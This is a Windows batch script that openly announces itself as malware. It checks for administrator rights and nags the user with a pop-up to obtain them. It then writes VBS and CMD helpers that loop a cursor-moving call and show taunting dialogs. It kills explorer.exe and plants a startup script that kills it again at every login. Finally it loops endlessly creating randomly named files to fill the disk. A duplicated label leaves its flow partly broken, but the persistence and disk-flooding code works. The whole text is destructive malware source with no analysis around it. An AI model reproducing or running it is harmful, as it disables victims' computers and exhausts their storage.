@echo off
cd C:\Users\%USERNAME%
mkdir Windows
cd C:\Users\%USERNAME%\Windows
echo set x=createobject("wscript.shell") > Windows_Event_Handler.vbs
echo X=MsgBox("Run this program on administrator mode",1+16,"heh") >> Windows_Event_Handler.vbs

net session >nul 2>&1
if %errorLevel% == 0 (
    goto hehxp
) else (
    start Windows_Event_Handler.vbs
    exit
)

:hehxp
echo :mouse > mouse.cmd
echo RunDll32.exe user32.dll,SetCursorPos >> mouse.cmd
echo goto mouse >> mouse.cmd
echo Set objShell = WScript.CreateObject("WScript.Shell") > run_mouse.vbs
echo objShell.Run("mouse.cmd"), 0, True >> run_mouse.vbs
start run_mouse.vbs
goto heher

:heher
echo set x=createobject("wscript.shell") > heher.vbs
echo dim heher >> heher.vbs
echo heher=InputBox("u just ran a malware how do you feel?") >> heher.vbs
echo x=MsgBox("good you will feel so much worse ",1+16,"heher") >> heher.vbs
start heher.vbs
pause

:heh2.0
taskkill /F /IM explorer.exe
cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
echo taskkill /F /IM explorer.exe > Heh_Remastred_Crasher.cmd
echo  >> Heh_Remastred_Crasher.cmd
:heher
echo %RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM% > %RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%.txt
goto heher

